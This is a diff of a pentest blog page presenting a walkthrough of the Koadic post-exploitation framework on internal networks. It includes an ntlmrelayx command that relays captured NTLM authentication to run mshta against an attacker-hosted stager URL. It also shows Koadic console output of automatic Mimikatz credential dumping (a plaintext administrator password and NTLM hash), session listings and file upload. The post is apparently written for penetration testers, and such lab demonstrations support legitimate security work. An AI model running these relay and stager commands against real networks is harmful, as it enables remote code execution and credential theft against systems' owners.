@@ -11,8 +11,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Overview # How I Use it on Internals # sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of &amp;#39;save_the_NTLMv2hashes.txt&amp;#39; -c &amp;#39;mshta http://AttackingHost:9999/sploit&amp;#39; What I Did for You Guys # Hacking things - TLDRs Start Here ⤵ # For demonstrative purposes I executed the mshta through windows explorer like so:
-(koadic: sta/js/mshta)$ run [&#43;] Spawned a stager at http://AttackingIP:9999/sploit [!] Dont edit this URL! (See: &amp;#39;help portfwd&amp;#39;) [&amp;gt;] mshta http://AttackingIP:9999/sploit [&#43;] Zombie 0: Staging new connection (100."
+  content="Overview # I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool."
 />
 <meta
   name="keywords"
@@ -48,14 +47,12 @@
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="How I Use Koadic on Internals"/>
-<meta name="twitter:description" content="Overview # How I Use it on Internals # sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of &#39;save_the_NTLMv2hashes.txt&#39; -c &#39;mshta http://AttackingHost:9999/sploit&#39; What I Did for You Guys # Hacking things - TLDRs Start Here ⤵ # For demonstrative purposes I executed the mshta through windows explorer like so:
-(koadic: sta/js/mshta)$ run [&#43;] Spawned a stager at http://AttackingIP:9999/sploit [!] Dont edit this URL! (See: &#39;help portfwd&#39;) [&gt;] mshta http://AttackingIP:9999/sploit [&#43;] Zombie 0: Staging new connection (100."/>
+<meta name="twitter:description" content="Overview # I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool."/>
 
 
 
 <meta property="og:title" content="How I Use Koadic on Internals" />
-<meta property="og:description" content="Overview # How I Use it on Internals # sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of &#39;save_the_NTLMv2hashes.txt&#39; -c &#39;mshta http://AttackingHost:9999/sploit&#39; What I Did for You Guys # Hacking things - TLDRs Start Here ⤵ # For demonstrative purposes I executed the mshta through windows explorer like so:
-(koadic: sta/js/mshta)$ run [&#43;] Spawned a stager at http://AttackingIP:9999/sploit [!] Dont edit this URL! (See: &#39;help portfwd&#39;) [&gt;] mshta http://AttackingIP:9999/sploit [&#43;] Zombie 0: Staging new connection (100." />
+<meta property="og:description" content="Overview # I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/how-i-use-koadic-on-internals/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-08-02T19:48:17-06:00" />
@@ -179,8 +176,6 @@
         </span>
 
         
-          
-        
       
 
       
@@ -188,7 +183,7 @@
 
       
         <span class="post-read-time"
-          >— 3 min read</span
+          >— 5 min read</span
         >
       
     </div>
@@ -203,31 +198,55 @@
   Overview
   <a href="#overview" class="h-anchor" aria-hidden="true">#</a>
 </h1>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<p style="text-align:justify;">
+<b>I LOVE KOADIC!!</b> Yes this doesn't work out of the box against Windows 10+ machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it's organization and implementation of Mimikatz which is probably the real MVP of the tool. It also does a fantastic job of enumerating domain information that can be used alongside of your <a href="https://github.com/BloodHoundAD">Bloodhound</a> enumeration as well. I also really really love the <b>creds</b> functionality and how it stores captured credentials and allows you to search through them at will. After you conduct your domain enumeration it even identifies credentials that belong to <b>Domain Admins</b>!</p>
+<center><a href="https://github.com/zerosum0x0/koadic">Download Koadic!</a></center>
 <h3 id="how-i-use-it-on-internals">
   How I Use it on Internals
   <a href="#how-i-use-it-on-internals" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<p style="text-align:justify;">
+So what I do on internals is have NTLMRELAYx execute the staging command when using <a href="https://github.com/SpiderLabs/Responder">Responder</a> to man-in-the-middle LLMNR traffic. Since this isn't a full blown <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">tutorial</a> on that process and one focused solely on Koadic I'll leave you with the command I generally use with NTLMRELAYx:
+</p>
+<center>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of <span style="color:#e6db74">&#39;save_the_NTLMv2hashes.txt&#39;</span> -c <span style="color:#e6db74">&#39;mshta http://AttackingHost:9999/sploit&#39;</span>      
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div></center>
+<p style="text-align:justify;">
+Because Koadic lets you run Mimikatz as soon as you can get a connect-back this will result in <b>RAINING SHELLS WITH RAINING PLAIN-TEXT CREDS!!!!</b> No joke, you could get sets of Domain/Enterprise Admin creds AND hundreds of sessions if SMB Signing is disabled on internal networks. Yes, by doing this I have had over 200 shells/zombies at a once before on an internal assessment (counter productive and unnecessary I know). It was primarily due to the high volume of SMB traffic.  
+</p>
 <h3 id="what-i-did-for-you-guys">
   What I Did for You Guys
   <a href="#what-i-did-for-you-guys" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<!-- raw HTML omitted -->
+<p style="text-align:justify;">
+So for this blog, I took some time and spun up an AWS Windows 2012 instance (something seen often on internals) just so I can show off some of the functionality. As usual the next section is going to be pretty fast pace so you guys can ingest this stuff as quickly and as clearly as possible. Let's get you guys to a point where you can wreck with this thing already!</p>
 <h1 id="hacking-things---tldrs-start-here-">
   Hacking things - TLDRs Start Here ⤵
   <a href="#hacking-things---tldrs-start-here-" class="h-anchor" aria-hidden="true">#</a>
 </h1>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<p style="text-align:justify;">
+When you start using Koadic obviously you need to pip3 the "reqs" and get it setup for usage. After you launch it you should see the main screen. In this screenshot you can see I set the end part of the staging URL to be sploit by using <b>[set ENDPOINT sploit]</b>. I also set up the stager to run Mimikatz on anything that connects to it by configuring the module using <b>[set MODULE implant/inject/mimikatz_dotnet2js]</b>. If you have a network with a lot of:
+</p>
+<center>
+<figure>
+<img src="../../images/Why I Love Koadic/Options.png" alt="Koadic Settings" />
+<figcaption>
+<center>Koadic Settings</center>
+</figcaption>
+</figure>
+</center>
 <p>For demonstrative purposes I executed the mshta through windows explorer like so:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<center>
+<figure>
+<img src="../../images/Why I Love Koadic/launching_on_windows.png" alt="Executing Stager on Windows" />
+<figcaption>
+<center>Executing Stager on Windows</center>
+</figcaption>
+</figure>
+</center>
+<p style="text-align:justify;">
+Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: sta/js/mshta<span style="color:#f92672">)</span>$ run
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Spawned a stager at http://AttackingIP:9999/sploit
@@ -265,8 +284,12 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>            <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>           <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>Administrator     WIN-LKC4723RPHF  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>win-lkc4723rphf<span style="color:#ae81ff">\$</span>  WORKGROUP        <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div><figcaption>
+<center>Dumping Creds upon Connection</center>
+</figcaption>
+<p style="text-align:justify;">
+If you want to check the status of the compromised hosts that you have so far you can use the command <b>[Zombies]</b>.
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: sta/js/mshta<span style="color:#f92672">)</span>$ zombies
 </span></span><span style="display:flex;"><span>
@@ -279,22 +302,34 @@
 </span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;zombies IP&#34;</span> <span style="color:#66d9ef">for</span> sessions on a particular host.
 </span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;zombies DOMAIN&#34;</span> <span style="color:#66d9ef">for</span> sessions on a particular Windows domain.
 </span></span><span style="display:flex;"><span>Use <span style="color:#e6db74">&#34;zombies killed&#34;</span> <span style="color:#66d9ef">for</span> sessions that have been manually killed.
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div><figcaption>
+<center>Active and Dead Sessions</center>
+</figcaption>
+<p style="text-align:justify;">
+If you've got any active jobs running, the <b>[Jobs]</b> command will display them for you so you can see what finished and what failed:
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: sta/js/mshta<span style="color:#f92672">)</span>$ jobs
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        ID   STATUS    ZOMBIE              NAME                                    
 </span></span><span style="display:flex;"><span>        ---- --------- ----------          --------------------                    
 </span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>    Complete  171.31.92.16 <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>    stager/js/mshta                         
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div><figcaption>
+<center>Koadic Displaying a jobs status</center>
+</figcaption>
+<p style="text-align:justify;">
+Similarly, <b>[Creds]</b> will display all of the credentials Koadic was able to capture and display them in nice, neat output for you:
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: sta/js/mshta<span style="color:#f92672">)</span>$ creds
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        Cred ID  IP               USERNAME            DOMAIN              PASSWORD                 NTLM                                      
 </span></span><span style="display:flex;"><span>        -------  --               --------            ------              --------                 ----                                      
 </span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>        171.31.92.16     Administrator       WIN-LKC4723RPHF     qLTWjy%P<span style="color:#f92672">=</span><span style="color:#ae81ff">9</span>               9554475ea7e7f7c98c617ddbba4c55d8          
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div><figcaption>
+<center>Koadic Displaying Saved Creds</center>
+</figcaption>
+<p style="text-align:justify;">
+Koadic has a bunch of other handy modules. Just for a practicality I chose to show you guys the file upload utility. Here, I just uploaded a picture that I had lying around:
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: sta/js/mshta<span style="color:#f92672">)</span>$ use implant/util/upload_file
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>koadic: imp/uti/upload_file<span style="color:#f92672">)</span>$ options
 </span></span><span style="display:flex;"><span>
@@ -312,10 +347,19 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Zombie 0: Job <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>implant/util/upload_file<span style="color:#f92672">)</span> created.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Zombie 1: Job <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>implant/util/upload_file<span style="color:#f92672">)</span> created.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Zombie 1: Job <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>implant/util/upload_file<span style="color:#f92672">)</span> completed.
-</span></span></code></pre></div><!-- raw HTML omitted -->
+</span></span></code></pre></div><figcaption>
+<center>Options Used to Upload Files</center>
+</figcaption>
 <p>And the result:</p>
-<!-- raw HTML omitted -->
-<p>At this point you pretty much get the picture. Koadic can do a ton of other cool things too. <!-- raw HTML omitted -->When it works it destroys!<!-- raw HTML omitted --></p>
+<center>
+<figure>
+<img src="../../images/Why I Love Koadic/upload_results.png" alt="Result of File Upload" />
+<figcaption>
+<center>Result of File Upload</center>
+</figcaption>
+</figure>
+</center>
+<p>At this point you pretty much get the picture. Koadic can do a ton of other cool things too. <b>When it works it destroys!</b></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>____________
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span> K0ad1c R0x <span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">------------</span>
@@ -336,82 +380,19 @@
 </span></span><span style="display:flex;"><span>       <span style="color:#f92672">|</span> <span style="color:#f92672">|</span>    <span style="color:#f92672">|</span> <span style="color:#f92672">|</span>
 </span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;</span>__<span style="color:#f92672">/</span>    <span style="color:#960050;background-color:#1e0010">\</span>__<span style="color:#f92672">&gt;</span>
 </span></span></code></pre></div><p>For those of you that care here&rsquo;s my test boxes system information:</p>
-<!-- raw HTML omitted -->
+<center>
+<figure>
+<img src="../../images/Why I Love Koadic/sysinfo.png" alt="Image of Windows 2012 information" />
+<figcaption>
+<center>Image of Windows Server 2012 Test Machine</center>
+</figcaption>
+</figure>
+</center>
 
     </div>
     
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="/posts/installing-covenantv3.0-on-ubuntu-19-2019/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Installing Covenant v3.0 on Ubuntu 19</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="/posts/what-it_s-like-being-a-pentester-after-oscp/">
-                  <span class="button__text">What It&#39;s Like Being a Pentester After OSCP</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
-          </div>
-        </div>
-      
-    
 
     
-      
-        <script src="https://utteranc.es/client.js"
-        repo="clutchisback1/h4cklife.org"
-        issue-term="pathname"
-        label="general-comment"
-	theme="github-dark"
-        crossorigin="anonymous"
-        async>
-</script>
-
-
-
-
-<script>
-"use strict";
-
-!function() {
-  var t = window.driftt = window.drift = window.driftt || [];
-  if (!t.init) {
-    if (t.invoked) return void (window.console && console.error && console.error("Drift snippet included twice."));
-    t.invoked = !0, t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ], 
-    t.factory = function(e) {
-      return function() {
-        var n = Array.prototype.slice.call(arguments);
-        return n.unshift(e), t.push(n), t;
-      };
-    }, t.methods.forEach(function(e) {
-      t[e] = t.factory(e);
-    }), t.load = function(t) {
-      var e = 3e5, n = Math.ceil(new Date() / e) * e, o = document.createElement("script");
-      o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + n + "/" + t + ".js";
-      var i = document.getElementsByTagName("script")[0];
-      i.parentNode.insertBefore(o, i);
-    };
-  }
-}();
-drift.SNIPPET_VERSION = '0.3.1';
-drift.load('2pa2ip2k9udy');
-</script>
-
-
       
     
   </div>
